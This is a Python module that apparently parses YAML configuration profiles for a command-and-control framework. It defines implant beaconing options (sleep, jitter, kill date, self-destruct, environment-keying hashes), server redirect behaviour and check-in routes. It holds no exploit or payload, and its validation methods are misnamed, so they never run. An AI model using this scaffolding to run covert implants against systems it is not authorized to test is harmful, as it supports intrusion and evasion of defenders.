from dataclasses import dataclass, asdict, field, fields
from typing import Dict, List, TypeVar
from abc import ABC, abstractmethod

import yaml


@dataclass
class Profile(ABC):
    @staticmethod
    @abstractmethod
    def from_dict(d: dict) -> "Profile":
        pass

    @staticmethod
    @abstractmethod
    def from_yaml(y: str) -> "Profile":
        pass

    def to_json(self) -> dict:
        return asdict(self)

    def to_yaml(self) -> str:
        return yaml.dump(self.to_json())


@dataclass
class MaleableProfile(Profile):
    name: str
    routes: "Routes"
    globals: "GlobalOptions"
    implant_profile: "ImplantProfile"
    server_profile: "ServerProfile"

    def post_init(self):
        if not self.name:
            raise ValueError("Profile must have a name")

        if not self.globals:
            raise ValueError("Profile must have global options")

        if not self.implant_profile:
            raise ValueError("Profile must have an implant profile")

        if not self.server_profile:
            raise ValueError("Profile must have a server profile")

        if not self.routes:
            raise ValueError("Profile must have routes")

    @staticmethod
    def from_dict(d: dict) -> "MaleableProfile":
        name = d.get("name", "")
        globals = GlobalOptions.from_dict(d)
        implant_profile = ImplantProfile.from_dict(d)
        server_profile = ServerProfile.from_dict(d)
        routes = Routes.from_dict(d)
        return MaleableProfile(
            name=name,
            routes=routes,
            globals=globals,
            implant_profile=implant_profile,
            server_profile=server_profile,
        )

    @staticmethod
    def from_yaml(y: str) -> "MaleableProfile":
        return MaleableProfile.from_dict(yaml.safe_load(y))


@dataclass
class GlobalOptions(Profile):
    implant_id_cookie: str = field(default="SESSID")

    @staticmethod
    def from_dict(d: dict) -> "GlobalOptions":
        field_set = {f.name for f in fields(GlobalOptions)}
        filtered_args = {k: v for k, v in d.items() if k in field_set}
        return GlobalOptions(**filtered_args)

    @staticmethod
    def from_yaml(y: str) -> "GlobalOptions":
        return GlobalOptions.from_dict(yaml.safe_load(y))


@dataclass
class ImplantProfile(Profile):
    kill_date: str = field(default="")
    user_agent: str = field(default="")
    sleep: int = field(default=0)
    jitter: float = field(default=0.0)
    max_retries: int = field(default=-1)
    auto_self_destruct: bool = field(default=False)
    retry_wait: int = field(default=0)
    retry_jitter: float = field(default=0.0)
    tailoring_hash_function: str = field(default="sha256")
    tailoring_hash_rounds: int = field(default=1)
    tailoring_hashes: List[str] = field(default_factory=list)

    def post_init(self):
        if self.tailoring_hashes is None:
            self.tailoring_hashes = []

        # Check if any number fields are less than 0
        for field in self.__dataclass_fields__:
            if isinstance(getattr(self, field), int) or isinstance(
                getattr(self, field), float
            ):
                if getattr(self, field) < 0 and field != "max_retries":
                    raise ValueError(f"{field} must be greater than or equal to 0")

    @staticmethod
    def from_dict(d: dict) -> "ImplantProfile":
        field_set = {f.name for f in fields(ImplantProfile) if f.init}
        filtered_args = {k: v for k, v in d["client"].items() if k in field_set}
        return ImplantProfile(**filtered_args)

    @staticmethod
    def from_yaml(y: str) -> "ImplantProfile":
        return ImplantProfile.from_dict(yaml.safe_load(y))


@dataclass
class ServerProfile(Profile):
    headers: Dict[str, str] = field(default_factory=dict)
    redirect_url: str = field(default="https://www.google.com")

    @staticmethod
    def from_dict(d: dict) -> "ServerProfile":
        field_set = {f.name for f in fields(ServerProfile) if f.init}
        filtered_args = {k: v for k, v in d.items() if k in field_set}
        return ServerProfile(**filtered_args)

    @staticmethod
    def from_yaml(y: str) -> "ServerProfile":
        return ServerProfile.from_dict(yaml.safe_load(y))


class Route:
    path: str
    methods: List[str]

    def __init__(self, path: str, methods: List[str]):
        if not methods:
            raise ValueError("Route must have at least one method")
        if not path:
            raise ValueError("Route must have a path")

        self.path = path
        self.methods = methods

    @staticmethod
    def from_dict(d: dict) -> "Route":
        path = d.get("path", "")
        methods = d.get("methods", [])
        return Route(path, methods)


@dataclass(kw_only=True)
class Routes(Profile):
    base_path: str
    register: "Route"
    checkin: "Route"
    task_results: "Route"

    @staticmethod
    def from_dict(d: dict) -> "Routes":
        field_set = {f.name for f in fields(Routes)}
        filtered_args = {k: v for k, v in d.get("routes", {}).items() if k in field_set}
        base_path = d.get("routes", {}).get("base_path", "")
        if not base_path:
            raise ValueError("Routes must have a base path")
        del filtered_args["base_path"]
        for name, route in filtered_args.items():
            filtered_args[name] = Route.from_dict(route)
        return Routes(base_path=base_path, **filtered_args)

    @staticmethod
    def from_yaml(y: str) -> "Routes":
        return Routes.from_dict(yaml.safe_load(y))
